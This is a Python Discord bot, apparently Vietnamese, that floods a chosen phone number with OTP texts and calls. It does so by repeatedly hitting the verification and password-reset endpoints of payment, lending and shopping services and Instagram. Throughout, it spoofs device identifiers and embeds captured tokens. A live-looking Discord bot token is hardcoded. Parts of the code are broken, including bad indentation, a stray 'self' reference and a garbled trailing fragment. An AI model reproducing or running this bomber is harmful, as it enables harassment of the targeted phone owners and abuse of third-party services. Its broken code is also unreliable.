import discord,time
import random
import time
import os, sys, requests, json
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading
from random import choice, randint, shuffle
token = "MTAxOTYwNDA3MDcxMDkxMDk3Ng.GDL-JH.ZYJ4KYOVnBWOfzlQW9R-KC-_IHjMvDqcpMEFy4" ##Nhập Token Bot Dis vào đây
prefix = "!" ##Kí Tự Gọi Bot VD : !,?,+,-,>,....
intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix,help_command=None, intents=intents)
threading = ThreadPoolExecutor(max_workers=int(100000000))
def cang01(phone):
		requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone})).text
def cang02(phone):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user":"0"+phone,
        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone,
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user":"0"+phone,
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
"lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone,
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id" : "undefined",
        "sessionkey" : "",
        "user_phone" : "undefined",
        "authorization" : "Bearer undefined",
        "msgtype" : "SEND_OTP_MSG",
        "Host" : "api.momo.vn",
        "User-Agent" : "okhttp/3.14.17",
        "app_version": "31062",
        "app_code" : "3.1.6",
        "device_os" : "ANDROID",
        "Content-Type" : "application/json"
    }
    post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG",headers=h,json=data1).text
    post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,json=data).text
    try:
        t = post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,json=data).json()
    except:
        t = post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,json=data).text
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    
def cang03(phone):
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone})).text
   
   
def cang1(phone):
    requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN", headers={"Host": "api.alfrescos.com.vn","content-length": "124","accept-language": "vi-VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","brandcode": "ALFRESCOS","devicecode": "web","sec-ch-ua-platform": "\"Android\"","origin": "https://alfrescos.com.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://alfrescos.com.vn/","accept-encoding": "gzip, deflate, br"}, json=({"phoneNumber":"0"+phone,"secureHash":"add789229e0794d8508f948dacd710ae","deviceId":"","sendTime":1660806807513,"type":2})).text
    
    
def cang2(phone):
requests.post("https://api-stt.sieu-thi-tien.com/app/member/sendSmsCode", headers={"Host": "api-stt.sieu-thi-tien.com","content-length": "647","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","content-type": "text/plain;charset\u003dUTF-8","accept": "*/*","origin": "https://mobile.sieu-thi-tien.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://mobile.sieu-thi-tien.com/","accept-encoding": "gzip, deflate, br"},json=({"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":"20220828184826gi3uzymdyykebl2pkbk3dq346byaross64ff772bfe5245cea03bef55055583dc6fef3615b2993ee522a337456bf66777jz6om7z25dngnqifi0yuqurxrr4nihx01","termSysVersion":"8.1.0","termModel":"CPH1803","brand":"OPPO","termId":"null","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":"null","lat":"null"},"bizType":"0000","appName":"Sieu Thi Tien","packageName":"com.sieuthitiensaas.h5","screenResolution":"720,1520"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1661683732495","bizParams":{"phoneNum":"0"+phone,"code":"null","type":200,"channelCode":"sENV6"}})).text
    
def cang3(phone):
    requests.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", headers={"Host": "latte.lozi.vn","content-length": "101","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone})).text


def cang4(phone):
    requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone}})).text
    
    
def cang5(phone):
    requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", data={"phone":"84"+phone}).json()
    
def cang6(phone):
requests.post("https://foreignadmits.com/api/register-otp-generate-student", data={"mobile":phone,"countryCode":"+84"}).json()

def cang7(phone):
    requests.post("https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP", headers={"Host": "apigateway.f88.vn","content-length": "595","content-encoding": "gzip","traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01","sec-ch-ua-mobile": "?1","authorization": "Bearer null","content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://online.f88.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://online.f88.vn/","accept-encoding": "gzip, deflate, br"}, json={"phoneNumber":"0"+phone,"recaptchaResponse":"03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3","source":"Online"}).text
    
def cang8(phone):
    requests.get(f"http://vanhihi.ml/sms2.php?sdt=0{phone}").text
    
 
    
def cang9(phone):
    requests.get(f"http://vanhihi.ml/sms3.php?sdt=0{phone}").text
    
def cang10(phone):
    requests.get(f"http://vanhihi.ml/sms4.php?sdt=0{phone}").text
    
def cang11(phone):
    requests.get(f"http://vanhihi.ml/sms5.php?sdt=0{phone}").text
    
    
    
    
def cang12(phone):
	requests.get(f"http://vanhihi.ml/sms6.php?sdt=0{phone}").text


def cang13(phone):
	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=0{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json


def cang14(phone):
	requests.get(f"https://tettrungthu.vn/get-otp?phone={phone}&utmstring=?utm_content=942119&utm_medium=Ni1uCKf1MAx2...5q00k6xz").text

def cang15(phone):
requests.post("https://products.popsww.com/api/v5/auths/register", headers={"Host": "products.popsww.com","content-length": "89","profileid": "62e58a27c6f857005396318f","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw","x-env": "production","content-type": "application/json","lang": "vi","sub-api-version": "1.1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","api-key": "5d2300c2c69d24a09cf5b09b","platform": "wap","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://pops.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"fullName":"","account":"0"+phone,"password":"Abcxaxgh","confirmPassword":"Abcxaxgh"})).text
	
	
def cang16(phone):
            headers = {
                'Host': 'api.zalopay.vn',
                'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
                'x-device-model': 'iPhone8,2',
                'x-density': 'iphone3x',
                'authorization': 'Bearer ',
                'x-device-os': 'IOS',
                'x-drsite': 'off',
                'accept': '*/*',
                'x-app-version': '7.13.1',
                'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
                'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
                'x-platform': 'NATIVE',
                'x-os-version': '14.6',
            }
            params = {
                'phone_number': "0"+phone,
            }

            token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
            json_data = {
                'phone_number': "0"+phone,
                'send_otp_token': token,
            }

            response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
	
	

def cang17(phone):
response = requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json={'phone_number': f"0{phone}",'hash': self.random_string(40)}).json()['meta']['msg']


def CBot(phone, amount):
    for i in range(amount):
       
        
        
        
        threading.submit(cang5,phone)



def DBot(phone, amount):
		for i in range(amount):
			
			
			
			
			
			threading.submit(cang01,phone)
			sleep(7)
			threading.submit(cang02,phone)
			sleep(7)
			threading.submit(cang4,phone)
		
		
		
		
		






    
def BBot(phone, amount):
    for i in range(amount):
       
        
        
        threading.submit(cang01,phone)
        threading.submit(cang02,phone)
        threading.submit(cang03,phone)
        threading.submit(cang1,phone)
        threading.submit(cang2,phone)
        threading.submit(cang3,phone)
        threading.submit(cang3,phone)
        threading.submit(cang4,phone)
        threading.submit(cang5,phone)
        threading.submit(cang6,phone)
        threading.submit(cang7,phone)
        threading.submit(cang8,phone)
        threading.submit(cang9,phone)
        threading.submit(cang10,phone)
        threading.submit(cang11,phone)
        threading.submit(cang12,phone)
        threading.submit(cang13,phone)
        threading.submit(cang14,phone)
        threading.submit(cang15,phone)
        threading.submit(cang16,phone)
        threading.submit(cang17,phone)

        
        
        
        
        


        
       
        
        
        
@bot.event
async def on_connect():
	os.system("clear")
	print(f"Connecting Bot User : {bot.user}")
	time.sleep(1.0)
	print("Bot Is Online Now !!!") ###print connect succes bot
    

    
   

    
   
	
	
    
    
    
   



@bot.command()
async def fpt(ctx, phone, amount:int):
	if (amount < 101 ):
		emsent = discord.Embed(title="🚀 **𝘽𝙊𝙏 𝙎𝙈𝙎 𝙋𝙍𝙊** 🚀", color=discord.Colour.random())
		gn = ["https://media.giphy.com/media/TW3Iner7O2egm64seb/giphy.gif","https://media.giphy.com/media/5eFFiVzRjeeRCEeTAP/giphy.gif","https://media.giphy.com/media/3oz8xQQP4ahKiyuxHy/giphy.gif","https://media.giphy.com/media/l0MYDSv9mzn6Rar8A/giphy.gif","https://media.giphy.com/media/l0MYDSv9mzn6Rar8A/giphy.gif","https://media.giphy.com/media/bvcXhfz2e9y7K/giphy.gif","https://media.giphy.com/media/jnQYWZ0T4mkhCmkzcn/giphy.gif","https://media.giphy.com/media/RrVzUOXldFe8M/giphy.gif"]
		gnrd = random.choice(gn)
		emsent.set_thumbnail(url=gnrd)
		emsent.add_field(name="**TARGET**",value=f"```0{phone}```")
		emsent.add_field(name="**TYPE**",value="```FPT Sms```")
		emsent.add_field(name="**AMOUNT**",value=f"```{amount}```")
		emsent.add_field(name="**STATUS**",value="```Success```")
ca = ["https://media.giphy.com/media/iAKXyzgLVtKsU/giphy.gif","https://media.giphy.com/media/WRoLGgwE4xTQYTxyJg/giphy.gif","https://media.giphy.com/media/O3GqAYR9jFxLi/giphy.gif","https://media.giphy.com/media/115BJle6N2Av0A/giphy.gif","https://media.giphy.com/media/lo4hWSPgBJLlUjGYeK/giphy.gif","https://media.giphy.com/media/3oKIPlCroSFHV8uoko/giphy.gif","https://media.giphy.com/media/kPVTbiTORIopy/giphy.gif","https://media.giphy.com/media/GJqFmCW5TKegszEkCW/giphy.gif","https://media.giphy.com/media/07kvmsfQYdzeUMHhCU/giphy.gif","https://media.giphy.com/media/azBv1j8nhdqTQ8R9kY/giphy.gif"]
		rd1 = random.choice(ca)
		emsent.set_image(url=rd1)
		emsent.set_footer(text=f"© Developer : HoàngMods#4644 | Request By {ctx.author.name}")
		
		
		await ctx.channel.send(embed=emsent)
		
		CBot(phone, amount)
	else:
		embentd = discord.Embed(title="🚀 **𝘽𝙊𝙏 𝙎𝙈𝙎 𝙋𝙍𝙊** 🚀", color=0xFF0000)
		embentd.add_field(name="**WARNING**",value="`Spam Max 100 Thôi Nhé !!!`")
		embentd.set_footer(text=f" © Developer : HoàngMods#4644 | Warning {ctx.author.name} !!!")
		await ctx.reply(embed=embentd)
	



@bot.command()
async def call(ctx, phone, amount:int):
	if (amount < 2):
		emsend = discord.Embed(title="🚀 **𝘽𝙊𝙏 𝙎𝙈𝙎 𝙋𝙍𝙊** 🚀", color=discord.Colour.random())
		gn = ["https://media.giphy.com/media/TW3Iner7O2egm64seb/giphy.gif","https://media.giphy.com/media/5eFFiVzRjeeRCEeTAP/giphy.gif","https://media.giphy.com/media/3oz8xQQP4ahKiyuxHy/giphy.gif","https://media.giphy.com/media/l0MYDSv9mzn6Rar8A/giphy.gif","https://media.giphy.com/media/l0MYDSv9mzn6Rar8A/giphy.gif","https://media.giphy.com/media/bvcXhfz2e9y7K/giphy.gif","https://media.giphy.com/media/jnQYWZ0T4mkhCmkzcn/giphy.gif","https://media.giphy.com/media/RrVzUOXldFe8M/giphy.gif"]
		gnrd = random.choice(gn)
		emsend.set_thumbnail(url=gnrd)
		emsend.add_field(name="**TARGET**",value=f"```0{phone}```")
		emsend.add_field(name="**TYPE**",value="```CALL BETA```")
		emsend.add_field(name="**AMOUNT**",value=f"```{amount}```")
		emsend.add_field(name="**STATUS**",value="```Success```")
		ca = ["https://media.giphy.com/media/iAKXyzgLVtKsU/giphy.gif","https://media.giphy.com/media/WRoLGgwE4xTQYTxyJg/giphy.gif","https://media.giphy.com/media/O3GqAYR9jFxLi/giphy.gif","https://media.giphy.com/media/115BJle6N2Av0A/giphy.gif","https://media.giphy.com/media/lo4hWSPgBJLlUjGYeK/giphy.gif","https://media.giphy.com/media/3oKIPlCroSFHV8uoko/giphy.gif","https://media.giphy.com/media/kPVTbiTORIopy/giphy.gif","https://media.giphy.com/media/GJqFmCW5TKegszEkCW/giphy.gif","https://media.giphy.com/media/07kvmsfQYdzeUMHhCU/giphy.gif","https://media.giphy.com/media/azBv1j8nhdqTQ8R9kY/giphy.gif"]
		rd1 = random.choice(ca)
		emsend.set_image(url=rd1)
		emsend.set_footer(text=f"© Developer : HoàngMods#4644 | Requests By {ctx.author.name}")
		
		await ctx.channel.send(embed=emsend)
		
		DBot(phone, amount)
	else:
embentd = discord.Embed(title="🚀 **𝘽𝙊𝙏 𝙎𝙈𝙎 𝙋𝙍𝙊** 🚀", color=0xFF0000)
		embentd.add_field(name="**WARNING**",value="`Spam Max 1 Thôi Nhé !!!`")
		embentd.set_footer(text=f"© Developer : HoàngMods#4644 | Warning {ctx.author.name} !!!")
		await ctx.reply(embed=embentd)
		
		



@bot.command()
async def sms(ctx, phone, amount:int):
	if (amount < 101):
		embes = discord.Embed(title="🚀 **𝘽𝙊𝙏 𝙎𝙈𝙎 𝙋𝙍𝙊** 🚀", color=discord.Colour.random())
		gn = ["https://media.giphy.com/media/TW3Iner7O2egm64seb/giphy.gif","https://media.giphy.com/media/5eFFiVzRjeeRCEeTAP/giphy.gif","https://media.giphy.com/media/3oz8xQQP4ahKiyuxHy/giphy.gif","https://media.giphy.com/media/l0MYDSv9mzn6Rar8A/giphy.gif","https://media.giphy.com/media/l0MYDSv9mzn6Rar8A/giphy.gif","https://media.giphy.com/media/bvcXhfz2e9y7K/giphy.gif","https://media.giphy.com/media/jnQYWZ0T4mkhCmkzcn/giphy.gif","https://media.giphy.com/media/RrVzUOXldFe8M/giphy.gif"]
		gnrd = random.choice(gn)
		embes.set_thumbnail(url=gnrd)
		embes.add_field(name="**TARGET**",value=f"```0{phone}```")
		embes.add_field(name="**AMOUNT**",value=f"```{amount}```")
		embes.add_field(name="**TYPE**",value="```Sms & Momo```")
		embes.add_field(name="**STATUS**",value="```Success```")
		ca = ["https://media.giphy.com/media/iAKXyzgLVtKsU/giphy.gif","https://media.giphy.com/media/WRoLGgwE4xTQYTxyJg/giphy.gif","https://media.giphy.com/media/O3GqAYR9jFxLi/giphy.gif","https://media.giphy.com/media/115BJle6N2Av0A/giphy.gif","https://media.giphy.com/media/lo4hWSPgBJLlUjGYeK/giphy.gif","https://media.giphy.com/media/3oKIPlCroSFHV8uoko/giphy.gif","https://media.giphy.com/media/kPVTbiTORIopy/giphy.gif","https://media.giphy.com/media/GJqFmCW5TKegszEkCW/giphy.gif","https://media.giphy.com/media/07kvmsfQYdzeUMHhCU/giphy.gif","https://media.giphy.com/media/azBv1j8nhdqTQ8R9kY/giphy.gif"]
		rd1 = random.choice(ca)
		embes.set_image(url=rd1)
		embes.set_footer(text=f"© Developer : HoàngMods#4644 | Requests By {ctx.author.name}")
		
		await ctx.channel.send(embed=embes)
		
		
		
		
		BBot(phone, amount)
	else:
		embent = discord.Embed(title="🚀 **𝘽𝙊𝙏 𝙎𝙈𝙎 𝙋𝙍𝙊** 🚀", color=0xFF0000)
		embent.add_field(name="**WARNING**",value="`Spam Max 100 Thôi Nhé !!!`")
		embent.set_footer(text=f"© Developer : HoàngMods#4644 | Warning {ctx.author.name} !!!")
		await ctx.reply(embed=embent)

		

		


	
    
    
    

@bot.command()
async def help(ctx):
	emBed = discord.Embed(title="🚀 **𝘽𝙊𝙏 𝙎𝙈𝙎 𝙋𝙍𝙊** 🚀", description="✨ **HELP MENU** ✨", color=discord.Colour.random())
	emBed.add_field(name="**CALL BETA Spammer**",value=f"`!call [phone] 1`")
	emBed.add_field(name="**FPT Spammer**",value=f"`!fpt [phone] [amount]`")
	emBed.add_field(name="**SMS Spammer**",value=f"`!sms [phone] [amount]`")
emBed.add_field(name="**Warning**",value=f"`• Phải Có Role @BETA\n• Bỏ Số 0 ở Đầu Số Điện Thoại\n• phone : số điện thoại muốn spam\n• amount : số lần spam\n• Spam Tối Đa 100/1 Lần`")
	emBed.set_footer(text=f"© Developer : HoàngMods#4644 | Requests By {ctx.author.name}")
	
	
	await ctx.channel.send(embed=emBed)
    
    
bot.run(token)
def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
json_data = { 'phone_number': '0'+phone, 'hash': random_string(40), } try: response = requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()['meta']['msg'] print(self.format_print("",f"GBAY: SUCCESS!")) except: print(self.format_print("",f"GBAY: ERROR!"))
